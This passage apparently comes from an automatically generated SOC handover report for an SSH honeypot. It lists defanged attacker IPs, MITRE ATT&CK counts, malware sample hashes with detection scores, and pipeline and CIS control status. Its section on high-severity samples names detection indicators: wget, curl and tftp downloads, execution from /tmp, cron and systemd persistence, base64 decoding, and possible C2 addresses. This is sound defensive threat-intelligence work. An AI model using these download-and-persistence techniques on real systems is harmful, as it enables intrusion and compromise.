| `194.88.98[.]120` | 1 | 2026-09-24 06:14 | 2026-09-24 06:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.96.139[.]232` | 1 | 2026-09-24 05:03 | 2026-09-24 05:04 | 2s | 0 | `T1592` | 🟢 LOW |
| `213.177.179[.]195` | 1 | 2026-09-24 06:21 | 2026-09-24 06:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `213.230.78[.]192` | 1 | 2026-09-24 08:06 | 2026-09-24 08:07 | 13s | 0 | `T1592` | 🟢 LOW |
| `216.244.250[.]182` | 1 | 2026-09-24 07:34 | 2026-09-24 07:34 | 10s | 0 | `T1592` | 🟢 LOW |
| `31.184.195[.]246` | 1 | 2026-09-24 04:54 | 2026-09-24 04:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `34.62.244[.]233` | 1 | 2026-09-24 06:06 | 2026-09-24 06:06 | 9s | 0 | `T1592` | 🟢 LOW |
| `35.149.16[.]157` | 1 | 2026-09-24 06:14 | 2026-09-24 06:14 | 15s | 0 | `T1592` | 🟢 LOW |
| `36.139.161[.]140` | 1 | 2026-09-24 03:58 | 2026-09-24 04:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]152` | 1 | 2026-09-24 07:08 | 2026-09-24 07:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.225.135[.]21` | 1 | 2026-09-24 06:48 | 2026-09-24 06:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]18` | 1 | 2026-09-24 08:37 | 2026-09-24 08:37 | 4s | 0 | `T1592` | 🟢 LOW |
| `45.56.79[.]53` | 1 | 2026-09-24 07:36 | 2026-09-24 07:36 | 3s | 0 | `T1592` | 🟢 LOW |
| `45.79.181[.]223` | 1 | 2026-09-24 04:38 | 2026-09-24 04:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]71` | 1 | 2026-09-24 06:38 | 2026-09-24 06:38 | 1s | 0 | `T1592` | 🟢 LOW |
| `45.79.5[.]11` | 1 | 2026-09-24 05:36 | 2026-09-24 05:36 | 5s | 0 | `T1592` | 🟢 LOW |
| `47.236.165[.]237` | 1 | 2026-09-24 05:35 | 2026-09-24 05:35 | 35s | 0 | `T1592` | 🟢 LOW |
| `58.56.200[.]238` | 1 | 2026-09-24 06:27 | 2026-09-24 06:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `62.108.201[.]221` | 1 | 2026-09-24 04:09 | 2026-09-24 04:09 | 23s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]197` | 1 | 2026-09-24 06:12 | 2026-09-24 06:12 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]55` | 1 | 2026-09-24 04:18 | 2026-09-24 04:18 | 4s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]132` | 1 | 2026-09-24 07:51 | 2026-09-24 07:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]178` | 1 | 2026-09-24 06:55 | 2026-09-24 06:55 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]102` | 1 | 2026-09-24 04:46 | 2026-09-24 04:46 | 16s | 0 | `T1592` | 🟢 LOW |
| `66.228.62[.]150` | 1 | 2026-09-24 04:42 | 2026-09-24 04:42 | 4s | 0 | `T1592` | 🟢 LOW |
| `72.14.178[.]148` | 1 | 2026-09-24 06:38 | 2026-09-24 06:38 | 1s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]121` | 1 | 2026-09-24 05:31 | 2026-09-24 05:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-09-24 04:31 | 2026-09-24 04:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `81.28.167[.]30` | 1 | 2026-09-24 07:09 | 2026-09-24 07:11 | 120s | 0 | `T1592` | 🟢 LOW |
| `84.54.73[.]16` | 1 | 2026-09-24 04:01 | 2026-09-24 04:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]6` | 1 | 2026-09-24 04:00 | 2026-09-24 04:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]69` | 1 | 2026-09-24 04:42 | 2026-09-24 04:43 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `77.239.124[.]121` | NL | ROCKET & MARINICA LTD | **100** ⚠️ | 16 |
| `14.103.107[.]29` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `45.79.5[.]11` | US | Linode | **100** ⚠️ | 50 |
| `34.62.244[.]233` | BE | Google LLC | **100** ⚠️ | 3 |
| `20.98.166[.]207` | US | Microsoft Corporation | **100** ⚠️ | 1 |
| `213.177.179[.]195` | NL | wcd | **100** ⚠️ | 15 |
| `94.154.43[.]69` | NL | Storm Industries LLC | **100** ⚠️ | 46 |
| `34.62.71[.]20` | BE | Google LLC | **100** ⚠️ | 2 |
| `160.119.66[.]206` | NL | HostMem | **100** ⚠️ | 37 |
| `196.0.3[.]188` | UG | Uganda Telecom Ltd | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 144 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 124 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 40 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 32 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 8 |

---

## 🔕 False Positive Summary (42 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 10 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 30 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 405 cases |
| Tool 34  | Credential Extractor        | ✅ 184 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 22 fingerprints |
| Tool 36  | Command Clustering          | ✅ 12 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 141 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 42 filtered (10.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 71 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 23 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 124 priority case(s) shown individually · 79 recon entry/entries in table (26 group(s) consolidating 186 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-09-24T09:10:40Z_
